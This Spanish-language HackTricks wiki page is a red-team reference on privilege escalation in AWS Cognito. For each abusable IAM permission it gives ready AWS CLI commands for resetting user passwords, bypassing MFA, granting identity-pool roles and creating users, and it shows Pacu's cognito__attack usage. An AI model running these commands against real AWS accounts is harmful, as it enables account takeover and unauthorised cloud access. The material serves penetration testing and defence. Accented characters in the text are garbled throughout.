# AWS - Cognito Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Cognito

Para m谩s informaci贸n sobre Cognito, consulta:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Recolecci贸n de credenciales del Identity Pool

Como Cognito puede otorgar **credenciales de rol IAM** tanto a **usuarios autenticados** como a **no autenticados**, si localizas el **ID del Identity Pool** de una aplicaci贸n (deber铆a estar codificado en ella) puedes obtener nuevas credenciales y, por lo tanto, privesc (dentro de una cuenta de AWS donde probablemente no ten铆as ninguna credencial previamente).

Para m谩s informaci贸n [**consulta esta p谩gina**](../aws-unauthenticated-enum-access/#cognito).

**Impacto Potencial:** Privesc directo al rol de servicios adjunto a usuarios no autenticados (y probablemente al que est谩 adjunto a usuarios autenticados).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Con este permiso puedes **otorgar cualquier rol de cognito** a los usuarios autenticados/no autenticados de la aplicaci贸n cognito.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
Si la aplicaci贸n de cognito **no tiene habilitados los usuarios no autenticados**, es posible que tambi茅n necesites el permiso `cognito-identity:UpdateIdentityPool` para habilitarlo.

**Impacto Potencial:** Privesc directo a cualquier rol de cognito.

### `cognito-identity:update-identity-pool`

Un atacante con este permiso podr铆a establecer, por ejemplo, un Cognito User Pool bajo su control o cualquier otro proveedor de identidad donde pueda iniciar sesi贸n como **una forma de acceder a este Cognito Identity Pool**. Luego, simplemente **iniciar sesi贸n** en ese proveedor de usuarios **le permitir谩 acceder al rol autenticado configurado en el Identity Pool**.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
Tambi茅n es posible **abusar de este permiso para permitir la autenticaci贸n b谩sica**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Impacto Potencial**: Comprometer el rol IAM autenticado configurado dentro del grupo de identidades.

### `cognito-idp:AdminAddUserToGroup`

Este permiso permite **agregar un usuario de Cognito a un grupo de Cognito**, por lo tanto, un atacante podr铆a abusar de este permiso para agregar un usuario bajo su control a otros grupos con **mejores** privilegios o **diferentes roles IAM**:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Impacto Potencial:** Privesc a otros grupos de Cognito y roles de IAM adjuntos a Grupos de User Pool.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Un atacante con estos permisos podr铆a **crear/actualizar grupos** con **cada rol de IAM que puede ser utilizado por un Proveedor de Identidad de Cognito comprometido** y hacer que un usuario comprometido sea parte del grupo, accediendo a todos esos roles:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Impacto Potencial:** Privesc a otros roles IAM de Cognito.

### `cognito-idp:AdminConfirmSignUp`

Este permiso permite **verificar un registro**. Por defecto, cualquiera puede iniciar sesi贸n en aplicaciones de Cognito; si eso se deja, un usuario podr铆a crear una cuenta con cualquier dato y verificarla con este permiso.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Impacto Potencial:** Privesc indirecto al rol IAM del grupo de identidades para usuarios autenticados si puedes registrar un nuevo usuario. Privesc indirecto a otras funcionalidades de la aplicaci贸n al poder confirmar cualquier cuenta.

### `cognito-idp:AdminCreateUser`

Este permiso permitir铆a a un atacante crear un nuevo usuario dentro del grupo de usuarios. El nuevo usuario se crea como habilitado, pero necesitar谩 cambiar su contrase帽a.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Impacto Potencial:** Privesc directo al rol IAM del grupo de identidades para usuarios autenticados. Privesc indirecto a otras funcionalidades de la aplicaci贸n al poder crear cualquier usuario.

### `cognito-idp:AdminEnableUser`

Este permiso puede ayudar en un escenario muy espec铆fico donde un atacante encontr贸 las credenciales de un usuario deshabilitado y necesita **habilitarlo nuevamente**.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Impacto Potencial:** Privesc indirecto al rol IAM del grupo de identidades para usuarios autenticados y permisos del usuario si el atacante ten铆a credenciales para un usuario deshabilitado.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

Este permiso permite iniciar sesi贸n con el [**m茅todo ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**.** Para m谩s informaci贸n, sigue el enlace.

### `cognito-idp:AdminSetUserPassword`

Este permiso permitir铆a a un atacante **cambiar la contrase帽a de cualquier usuario**, permiti茅ndole suplantar a cualquier usuario (que no tenga MFA habilitado).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Impacto Potencial:** Privesc directo a potencialmente cualquier usuario, por lo que se tiene acceso a todos los grupos de los que cada usuario es miembro y acceso al rol IAM autenticado del Identity Pool.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: Un atacante podr铆a potencialmente abusar de este permiso para establecer un tel茅fono m贸vil bajo su control como **SMS MFA de un usuario**.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** Similar al anterior, este permiso se puede utilizar para establecer las preferencias de MFA de un usuario para eludir la protecci贸n de MFA.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: Similar al anterior, este permiso se puede utilizar para establecer las preferencias de MFA de un grupo de usuarios para eludir la protecci贸n de MFA.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** Tambi茅n es posible actualizar el grupo de usuarios para cambiar la pol铆tica de MFA. [Consulta cli aqu铆](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Impacto Potencial:** Privesc indirecto a potencialmente cualquier usuario cuyas credenciales conozca el atacante, esto podr铆a permitir eludir la protecci贸n de MFA.

### `cognito-idp:AdminUpdateUserAttributes`

Un atacante con este permiso podr铆a cambiar el correo electr贸nico o el n煤mero de tel茅fono o cualquier otro atributo de un usuario bajo su control para intentar obtener m谩s privilegios en una aplicaci贸n subyacente.\
Esto permite cambiar un correo electr贸nico o n煤mero de tel茅fono y configurarlo como verificado.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Impacto Potencial:** Privesc indirecto potencial en la aplicaci贸n subyacente que utiliza Cognito User Pool, que otorga privilegios basados en atributos de usuario.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Un atacante con este permiso podr铆a **crear un nuevo Cliente de User Pool menos restringido** que los clientes de pool existentes. Por ejemplo, el nuevo cliente podr铆a permitir cualquier tipo de m茅todo para autenticar, no tener ning煤n secreto, tener la revocaci贸n de tokens deshabilitada, permitir que los tokens sean v谩lidos por un per铆odo m谩s largo...

Lo mismo se puede hacer si, en lugar de crear un nuevo cliente, se **modifica uno existente**.

En la [**l铆nea de comandos**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (o el [**actualizar uno**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) puedes ver todas las opciones, 隆rev铆salo!.
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Impacto Potencial:** Potencial privesc indirecto al usuario autorizado del Identity Pool utilizado por el User Pool al crear un nuevo cliente que relaja las medidas de seguridad y permite a un atacante iniciar sesi贸n con un usuario que pudo crear.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Un atacante podr铆a abusar de este permiso para crear usuarios subiendo un csv con nuevos usuarios.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
(En el caso de que crees un nuevo trabajo de importaci贸n, tambi茅n podr铆as necesitar el permiso iam passrole, a煤n no lo he probado).

**Impacto Potencial:** Privesc directo al rol IAM del grupo de identidades para usuarios autenticados. Privesc indirecto a otras funcionalidades de la aplicaci贸n al poder crear cualquier usuario.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Un atacante podr铆a crear un nuevo proveedor de identidad para luego poder **iniciar sesi贸n a trav茅s de este proveedor**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Impacto Potencial:** Privesc directo al rol IAM del grupo de identidades para usuarios autenticados. Privesc indirecto a otras funcionalidades de la aplicaci贸n al poder crear cualquier usuario.

### cognito-sync:\* An谩lisis

Este es un permiso muy com煤n por defecto en los roles de los Grupos de Identidad de Cognito. Aunque un comod铆n en los permisos siempre se ve mal (especialmente viniendo de AWS), los **permisos otorgados no son muy 煤tiles desde la perspectiva de un atacante**.

Este permiso permite leer informaci贸n de uso de los Grupos de Identidad e IDs de Identidad dentro de los Grupos de Identidad (que no es informaci贸n sensible).\
Los IDs de Identidad pueden tener [**Conjuntos de Datos**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html) asignados a ellos, que son informaci贸n de las sesiones (AWS lo define como un **juego guardado**). Podr铆a ser posible que esto contenga alg煤n tipo de informaci贸n sensible (pero la probabilidad es bastante baja). Puedes encontrar en la [**p谩gina de enumeraci贸n**](../aws-services/aws-cognito-enum/) c贸mo acceder a esta informaci贸n.

Un atacante tambi茅n podr铆a usar estos permisos para **inscribirse en un flujo de Cognito que publica cambios** en estos conjuntos de datos o en una **lambda que se activa en eventos de cognito**. No he visto que esto se use, y no esperar铆a informaci贸n sensible aqu铆, pero no es imposible.

### Herramientas Autom谩ticas

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), el marco de explotaci贸n de AWS, ahora incluye los m贸dulos "cognito\_\_enum" y "cognito\_\_attack" que automatizan la enumeraci贸n de todos los activos de Cognito en una cuenta y marcan configuraciones d茅biles, atributos de usuario utilizados para el control de acceso, etc., y tambi茅n automatizan la creaci贸n de usuarios (incluido el soporte MFA) y la escalada de privilegios basada en atributos personalizados modificables, credenciales de grupo de identidades utilizables, roles asumibles en tokens de id, etc.

Para una descripci贸n de las funciones de los m贸dulos, consulta la parte 2 de la [entrada del blog](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Para instrucciones de instalaci贸n, consulta la p谩gina principal de [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### Uso

Ejemplo de uso de cognito\_\_attack para intentar la creaci贸n de usuarios y todos los vectores de privesc contra un grupo de identidades y cliente de grupo de usuarios dados:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Ejemplo de uso de cognito\_\_enum para recopilar todos los grupos de usuarios, clientes de grupos de usuarios, grupos de identidades, usuarios, etc. visibles en la cuenta de AWS actual:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) es una herramienta CLI en python que implementa diferentes ataques en Cognito, incluyendo una escalaci贸n de privilegios.

#### Instalaci贸n
```bash
$ pip install cognito-scanner
```
#### Uso
```bash
$ cognito-scanner --help
```
Para m谩s informaci贸n, consulta [https://github.com/padok-team/cognito-scanner](https://github.com/padok-team/cognito-scanner)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Consulta los [**planes de suscripci贸n**](https://github.com/sponsors/carlospolop)!
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
